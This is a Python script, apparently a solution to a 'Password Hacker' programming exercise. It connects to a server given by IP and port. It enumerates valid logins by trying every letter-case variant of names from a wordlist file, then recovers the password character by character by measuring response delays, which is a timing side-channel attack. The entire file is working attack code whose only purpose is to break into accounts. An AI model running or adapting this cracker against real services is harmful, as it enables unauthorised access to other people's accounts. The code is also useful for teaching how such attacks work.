import argparse
import socket
import sys
import itertools
import json
import time

parser = argparse.ArgumentParser()
parser.add_argument("ip")
parser.add_argument("p")
sys.argv = parser.parse_args()
alphabet_numbers = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
with socket.socket() as client_socket:
    hostname = sys.argv.ip
    port = int(sys.argv.p)
    address = (hostname, port)
    client_socket.connect(address)
    with open('C:\\Users\\User\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt',
              'r') as login_file:
        f_1 = True
        for j in login_file:
            line = j.strip()
            a = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line)))
            for k in a:
                acc = {
                    "login": k,
                    "password": ' '
                }
                json_str_acc = json.dumps(acc)
                json_str_acc = json_str_acc.encode()
                client_socket.send(json_str_acc)
                response = client_socket.recv(1024)
                response = response.decode()
                json_login = json.loads(response)
                if json_login["result"] == "Wrong login!":
                    continue
                else:
                    right_login = acc["login"]
                    f_2 = True
                    password = []
                    i = 0
                    while f_1:
                        for letter in alphabet_numbers:
                            s = "".join(password) + letter
                            acc = {
                                "login": right_login,
                                "password": s
                            }
                            json_str_acc = json.dumps(acc)
                            json_str_acc_1 = json.dumps(acc)
                            json_str_acc = json_str_acc.encode()
                            try:
                                start = time.time()
                                client_socket.send(json_str_acc)
                            except TypeError:
                                pass
                            else:
                                response = client_socket.recv(1024)
                                response = response.decode()
                                json_acc = json.loads(response)
                                if json_acc["result"] == "Connection success!":
                                    json_final = json.dumps(acc)
                                    print(json_final)
                                    f_2 = False
                                    f_1 = False
                                    break
                            finally:
                                end = time.time()
                                finish = end - start
                                if finish >= 0.1:
                                    password.append(letter)
                            if not f_2:
                                break
                        if not f_1:
                            break
                if not f_1:
                    break
            if not f_1:
                break
